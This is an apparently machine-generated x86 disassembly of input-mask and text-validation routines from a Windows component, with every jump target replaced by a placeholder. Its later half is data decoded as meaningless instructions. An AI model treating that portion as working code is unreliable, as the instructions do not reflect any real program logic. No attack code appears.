test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_404138
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_404138
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_404398
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_404398
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_404184
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458bb1
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403e9c
retn
mov eax [ esi ]
call sub_404138
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_404138
mov edx eax
dec edx
mov eax esi
call sub_4044c4
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_404138
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_404398
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_4569b0
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_404344
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_458bb8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_456f8c
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4569b0
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_458d4c
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_45942c
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_456f38
mov edi eax
mov edx edi
mov eax esi
call sub_457df4
jmp r-xdata
sub_458c6c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_458d3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_456f38
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_404138
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_4028f8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_4028f8
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_4578bc
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40bcb8
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_4578bc
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40bcb8
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458d41
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
sub_458d4c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_4569b0
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_456b04
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_456b80
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459005
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403e9c
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_403f10
lea eax [ ebp - 0x10 ]
call j_sub_404344
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_458c54
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_458c6c
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_458c6c
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_403f10
lea eax [ ebp - 0x10 ]
call j_sub_404344
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_407b7c
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_403f10
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_407b7c
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_403f10
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_407bb0
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_403f10
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_407bb0
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_403f10
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_459013
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_404138
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_4569b0
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_4590d0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_456f8c
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_404138
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_404344
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_4569b0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_459168
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_459418
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45941f
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_403e9c
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_403f10
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_456f8c
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404138
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4569b0
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_404138
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_458d4c
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40bcb8
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404138
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40bcb8
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404398
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404398
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_404184
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404398
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404138
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_404138
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_404398
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4041f8
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_404060
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_404140
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_404344
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_404344
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_404138
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404398
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_404060
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404138
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_404398
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4041f8
inc edi
sub_45942c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404138
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4569b0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_456b80
mov edx eax
mov ebp edi
jmp r-xdata
sub_459488
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4594ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4594b4
retn
sub_4594c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x95
inc ebp
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add ah al
xchg esi eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0x45 ] dh
add [ edx + 0x48004596 ] dh
add al [ eax ]
add [ esp + esi * 2 ] dl
inc ebp
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc eax 0x766e4945
popad
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x704f6469
jb r-xdata
inc ebx
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
je r-xdata
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x680042e0 ] bh
loopne r-xdata
add [ eax + 0x3000437a ] dl
mov [ ebx ] al
les ebp [ ebp - 0x1c9bffbb ]
inc edx
add ah dl
jecxz r-xdata
jo r-xdata
inc ecx
add [ esp + ebp * 2 + 0x43 ] ah
add [ ebx + esi - 0x1a63ffc0 ] al
inc edx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xad640041 0x45
js r-xdata
dec ecx
inc ebx
add al bh
cdq
outsd
outsb
mov eax eax
jo r-xdata
add [ eax ] cl
scasb [ edi ]
inc ebp
add [ eax - 0x52 ] cl
inc ebp
add [ eax + eax * 4 - 0x1e8fffbb ] ah
inc edx
loope r-xdata
add al cl
mov [ ebx ] al
int3
add al ah
jno r-xdata
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ eax ] dh
fild [ edx ]
mov esp 0x1000433f
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebx + esi * 4 + 0x6ee40045 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add ah bh
jae r-xdata

inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
push esi
popad
arpl [ ebp + 0x45 ] sp
imul esi [ fs : eax + edx * 4 - 0x3c ] 0x7004596
or al 0x54
dec ecx
outsb
jo r-xdata
add [ eax ] ch
scasb [ edi ]
inc ebp
add [ eax - 0x52 ] ch
inc ebp
add [ esi + ebp * 4 + 0x45 ] bh
add [ eax - 0x50 ] dh
inc ebp
add [ eax - 0x77ffba4e ] ah
mov bl 0x45
add [ esp + edx * 2 ] cl
dec ecx
outsb
jo r-xdata
add [ eax - 0x4fffba52 ] dh
add [ ebp ] 0x1c
nop
inc ebp
add [ eax - 0x77 ] ah
inc ebp
add al al
mov [ ebp ] al
fdiv [ ebp - 0x49bfffbb ]
inc ebp
add [ edx ] cl
add [ ecx ] bl
mov al 0x87
add [ edx ] al
add eax [ eax ]
add eax [ ebx ]
add ebp ecx
jmp edx
outsd
dec esp
imul ebp [ esi + 0x65 ] 0x486f670a
outsd
jb r-xdata
or eax 0x61526f67
popad
arpl [ ebp + 0x45 ] sp
imul esi [ fs : eax + esi * 2 - 0x6b ] 0x75d00045
inc ebp
add [ eax + eax ] cl
add eax 0x64697247
jae r-xdata
add al [ eax ]
add [ eax ] al
call 0xa45dd95
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] esp
inc esi
outsd
arpl [ ebp + 0x73 ] si
pop es
insb
arpl [ gs : edx + edx + 0x67 ] si
jns r-xdata
outsb
push ebx
insb
arpl [ gs : ebx + edx + 0x67 ] si
outsd
inc esp
jb r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x526f670d
popad
popad
ja r-xdata
add al ch
xchg esi eax
inc ebp
add [ ebx ] al
or edx [ edi + eax * 2 + 0x72 ]
imul esp [ edi + ecx * 2 + 0x70 ] 0x6e6f6974
add [ eax ] eax
add [ eax ] al
add [ esi ] cl
add [ eax ] al
add ah ah
xchg esi eax
inc ebp
add [ edi ] cl
outsd
inc esi
imul edi [ eax + 0x65 ] 0x72655664
je r-xdata
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc esp
jb r-xdata
jae r-xdata
push cs
add [ esi ] al
push ebx
push 0x6445776f
imul esi [ edi + ebp * 2 + 0x72 ] 0x546f670f
push edx
outsd
ja r-xdata
push es
outsd
outsd
arpl [ ebp + 0x73 ] si
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or esp [ edi + 0x6f ]
push edx
outsd
ja r-xdata
outsd
imul ebp [ esi + 0x65 ] 0x466f670f
imul edi [ eax + 0x65 ] 0x726f4864
jpe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] ah
cwde
ja r-xdata
insb
popad
outsb
ja r-xdata
outsd
ja r-xdata
inc esi
imul edi [ eax + 0x65 ] 0x72470564
imul esp [ ebx + esi * 2 + 0x24 ] 0x6004598
pop es
push esp
inc edi
jb r-xdata
arpl [ ebx + 0x69 ] bp
outsb
add eax 0x64697247
push 0x54626d75
jb r-xdata
inc ebp
imul esi [ fs : edi + ebp * 2 + 0x72 ] 0x546f670f
imul edi [ edx + 0x69 ] 0x670b676e
outsd
inc ebx
outsd
insb
push ebx
imul edi [ edx + 0x69 ] 0x670b676e
outsd
push edx
outsd
ja r-xdata
jb r-xdata
imul ebp [ esi + 0x65 ] 0x566f670a
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add ah bh
jae r-xdata
add eax 0x74617453
push cs
insb
insb
inc ebp
jbe r-xdata
popad
je r-xdata
add [ ecx ] ecx
dec ecx
outsb
je r-xdata
outsd
inc ecx
insb
ja r-xdata
arpl [ edx + edx + 0x67 ] si
xchg edi eax
inc ebp
add [ esi ] al
or al 0x54
inc edi
jb r-xdata
jae r-xdata
imul ebp [ ecx + 0x6e ] 0x67
add eax 0x64697247
outsd
jbe r-xdata
inc ebp
add [ eax + 0x280045bb ] ch
sub [ eax ] eax
push 0x540045c0
or eax [ esi ]
js r-xdata
add [ eax + 0x3000437a ] dl
mov [ ebx ] al
dec esp
out dx al
inc ebp
add [ eax ] bl
test [ ebx ] eax
dec eax
add [ ebx ] 0xffffffc8
mov [ ebx ] al
int3
add [ eax + edi * 4 + 0x45 ] cl
add [ esi + edi * 4 + 0x43 ] ah
inc esp
jb r-xdata
inc ebp
add [ ebp - 0x6693ffc0 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 4 + 0x45 ] cl
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
jb r-xdata
jb r-xdata
push ebx
insb
dec edi
jo r-xdata
inc ebp
add [ eax + r-xdata ] dl
add eax [ edx ]
xor eax [ cs : ecx ]
outsb
or esp [ bx + 0x6f ]
inc ebx
outsd
insb
dec ebp
outsd
jbe r-xdata
mov al 0x1e
mov al 0x19
mov al 0x2
add [ edi ] ebx
add [ ecx ] dl
add [ edi + 0x8011400 ] eax
add [ ecx ] al
add al [ eax + eax + 0x70020 ]
add eax 0x15011300
add [ edi + edi * 8 - 0x2a0046 ] edi
aam 0xff
sar edi cl
mov bl 0xff
sar edi 0xb2
push [ ecx - 0x1e004f01 ]
jmp eax
inc esi
add [ ecx ] dh
add [ eax + esi * 4 ] al
push cs
mov al 0x10
mov al 0x1c
add [ esi + edi * 4 + 0x45 ] ah
add ah bl
xor [ eax ] al
dec esp
mov eax 0xbe640045
inc ebx
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
adc [ eax ] al
test al 0x98
inc ebp
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
adc [ eax ] al
cmp al 0x10
arpl [ gs : ebx + eax * 2 + 0x65 ] si
insb
insb
inc ebp
jbe r-xdata
add eax ebp
xchg edi eax
inc ebp
add [ ebp - 0x67bfffc0 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + edx * 2 + 0x65 ] dl
insb
je r-xdata
add al 0x52
inc ebx
outsb
push ebx
insb
arpl [ gs : edi + eax + 0x42 ] si
outsd
outsd
or [ ebx + 0x61 ] eax
je r-xdata
outsb
outsb
je r-xdata
add [ eax + ecx ] al
imul ebp [ edi + 0x6e ] 0x96e40373
add [ eax ] al
add [ eax ] al
push esp
popad
bound esi [ ebx + 0xb ]
outsd
outsb
or [ bx + 0x6f ] esp
inc ebp
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x6f670667
je r-xdata
add [ ecx + eax * 2 ] al
inc ebx
outsd
insb
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc ecx
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
push esp
inc edi
jb r-xdata
push cs
test [ ebx ] dh
inc eax
add [ eax ] cl
pop [ ebx ]
shl [ eax ] 0x40
push es
push ebx
outsb
jb r-xdata
add al 0x8
add [ ecx + eax * 2 ] al
inc ebx
outsd
insb
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc ecx
je r-xdata
add [ eax ] al
push esp
0x9b7c0045 0x45
xchg esp eax
add al [ eax ]
add [ eax + 0x11 ] bl
inc ebx
add al ah
cdq
jb r-xdata
jb r-xdata
jb r-xdata
add [ esi + edi + 0x41 ] dh
add [ esp + ebp * 2 + 0x43 ] ah
